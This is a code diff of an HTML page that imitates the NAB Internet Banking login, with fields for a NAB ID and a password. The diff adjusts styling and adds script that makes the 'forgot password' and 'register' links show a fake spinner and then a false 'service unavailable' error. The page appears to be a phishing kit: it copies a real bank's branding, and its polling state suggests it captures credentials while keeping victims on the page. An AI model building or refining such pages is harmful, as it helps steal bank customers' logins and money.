@@ -4,22 +4,20 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>NAB Internet Banking</title>
-<!-- Add Inter font -->
+<!-- Inter font -->
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{
     box-sizing:border-box;
     margin:0;
     padding:0;
-    font-family: 'Inter', Arial, Helvetica, sans-serif; /* Inter first */
+    font-family: 'Inter', Arial, Helvetica, sans-serif;
 }
 
-/* BODY BACKGROUND IMAGE */
 body{
     background:url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e') no-repeat center/cover;
 }
 
-/* TOP BLACK HEADER - increased padding */
 .header{
     background:#000;
     color:#fff;
@@ -39,11 +37,10 @@ body{
     font-weight:500;
 }
 
-/* CARD - increased padding */
 .card{
     width:92%;
     max-width:380px;
-    background:#efefef;
+    background:#f3f3f3;
     margin:20px auto;
     padding:24px;
     border-radius:10px;
@@ -51,16 +48,14 @@ body{
     min-height: 460px;
 }
 
-/* TITLE - using Inter with weight 100 (thin) */
 .card h1{
     font-size:33px;
-    font-weight:200;      /* Inter supports 100 */
+    font-weight:200;
     margin-top: 30px;
     margin-bottom:24px;
-    color:#333;
+    color:#1f1f1f;
 }
 
-/* LABEL - bigger font & more top margin */
 .label{
     font-size:14px;
     font-weight:bold;
@@ -69,7 +64,6 @@ body{
     color:#222;
 }
 
-/* INPUT - bigger padding */
 .input{
     width:100%;
     padding:16px;
@@ -80,22 +74,35 @@ body{
     transition: border-color 0.2s;
 }
 
-/* error state for input */
 .input.input-error{
     border-color: #d32f2f;
 }
 
-/* ERROR TEXT - bigger */
+/* ERROR TEXT with perfect circle */
 .error{
-    color:#d32f2f;
+    color:#d32f2f;               /* text colour */
     font-size:14px;
     margin:8px 0 16px;
     display:flex;
     align-items:center;
-    gap:6px;
+    gap:8px;
 }
 
-/* CHECKBOX */
+.error-icon{
+    background:#d50000;
+    color:#fff;
+    border-radius:50%;
+    width:22px;
+    height:22px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:14px;
+    font-weight:bold;
+    line-height:1;            /* ensures perfect vertical centering */
+    flex-shrink:0;
+}
+
 .checkbox{
     display:flex;
     align-items:flex-start;
@@ -114,7 +121,6 @@ body{
     color:#333;
 }
 
-/* SMALL TEXT - bigger */
 .small-text{
     font-size:13px;
     color:#555;
@@ -122,7 +128,6 @@ body{
     line-height:1.5;
 }
 
-/* BUTTON - bigger padding */
 .btn{
     width:100%;
     background:#d50000;
@@ -139,16 +144,15 @@ body{
     cursor:not-allowed;
 }
 
-/* LINKS */
 .link{
     display:block;
     margin-top:18px;
     color:#b00000;
     font-size:15px;
     text-decoration:underline;
+    cursor: pointer;
 }
 
-/* REGISTER SECTION */
 .register{
     margin-top:24px;
     padding-top:18px;
@@ -162,6 +166,7 @@ body{
     color:#b00000;
     font-weight:bold;
     text-decoration:underline;
+    cursor: pointer;
 }
 
 .logo{
@@ -172,7 +177,6 @@ body{
     object-fit:contain;
 }
 
-/* FOOTER - taller black area & bigger font */
 .footer{
     width:100%;
     text-align:center;
@@ -187,7 +191,6 @@ body{
     width:100%;
 }
 
-/* Eye icon – slightly bigger */
 .eye{
     position:absolute;
     right:16px;
@@ -200,11 +203,14 @@ body{
     z-index:3;
 }
 
+.eye.hidden {
+    background-image: url('https://cdn-icons-png.flaticon.com/512/2767/2767146.png');
+}
+
 .password-input{
     padding-right:48px;
 }
 
-/* ===== ERROR BOX ===== */
 .generic-error {
     display: none;
     background: #f5f5f5;
@@ -216,7 +222,8 @@ body{
     align-items:flex-start;
 }
 
-.error-icon{
+/* reuse same error-icon for generic box */
+.generic-error .error-icon{
     background:#d50000;
     color:#fff;
     border-radius:50%;
@@ -227,16 +234,16 @@ body{
     justify-content:center;
     font-size:14px;
     font-weight:bold;
-    margin-top:3px;
+    line-height:1;
+    flex-shrink:0;
 }
 
-.error-text{
+.generic-error .error-text{
     font-size:15px;
     color:#333;
     line-height:1.5;
 }
 
-/* ===== LOADING OVERLAY ===== */
 .card-loading {
     position: absolute;
     top: 0;
@@ -277,7 +284,6 @@ body{
 }
 </style>
 </head>
-
 <body>
 
 <div class="header">
@@ -299,14 +305,24 @@ body{
 
         <div class="label">NAB ID</div>
         <input class="input" type="text" id="nabId" placeholder="Enter NAB ID">
-        <div class="error" id="nabIdError" style="display:none;">❗ Enter your NAB ID.</div>
+
+        <!-- NAB ID error with circle -->
+        <div class="error" id="nabIdError" style="display:none;">
+            <span class="error-icon">!</span>
+            <span>Enter your NAB ID.</span>
+        </div>
 
         <div class="label">Password</div>
         <div class="password-wrapper">
             <input class="input password-input" type="password" id="password" placeholder="Enter password">
             <span class="eye" id="eyeIcon"></span>
         </div>
-        <div class="error" id="passwordError" style="display:none;">❗ Enter your password.</div>
+
+        <!-- Password error with circle -->
+        <div class="error" id="passwordError" style="display:none;">
+            <span class="error-icon">!</span>
+            <span>Enter your password.</span>
+        </div>
 
         <div class="checkbox">
             <input type="checkbox" id="remember">
@@ -319,11 +335,11 @@ body{
 
         <button class="btn" id="loginBtn">Login</button>
 
-        <a href="#" class="link">Forgot your NAB ID or password?</a>
+        <a href="#" class="link" id="forgotLink">Forgot your NAB ID or password?</a>
 
         <div class="register">
             <span>New to NAB Internet Banking?</span>
-            <a href="#">Register now</a>
+            <a href="#" id="registerLink">Register now</a>
         </div>
     </div>
 
@@ -356,20 +372,41 @@ body{
     const cardContent = document.getElementById('cardContent');
     const cardLoading = document.getElementById('cardLoading');
     const eyeIcon = document.getElementById('eyeIcon');
+    const forgotLink = document.getElementById('forgotLink');
+    const registerLink = document.getElementById('registerLink');
 
     // State
     let isSubmitting = false;
     let currentPollInterval = null;
     let pollTimeout = null;
 
-    // ==================== PASSWORD TOGGLE ====================
+    // ==================== PASSWORD TOGGLE with icon switch ====================
     eyeIcon.addEventListener('click', function() {
         if (passwordInput.type === 'password') {
             passwordInput.type = 'text';
+            eyeIcon.classList.add('hidden'); // eye-slash
         } else {
             passwordInput.type = 'password';
+            eyeIcon.classList.remove('hidden'); // regular eye
         }
     });
+
+    // ==================== LINK HANDLERS (forgot & register) ====================
+    function handleLinkClick(e) {
+        e.preventDefault();
+        if (isSubmitting) return;
+
+        showLoading(); // uses the same spinner as login
+
+        setTimeout(() => {
+            showContent();
+            errorText.innerText = 'Service temporarily unavailable. Please try again later.';
+            genericError.style.display = 'flex';
+        }, 3000);
+    }
+
+    forgotLink.addEventListener('click', handleLinkClick);
+    registerLink.addEventListener('click', handleLinkClick);
 
     // ==================== INPUT ERROR HIGHLIGHT ====================
     function setInputError(input, hasError) {
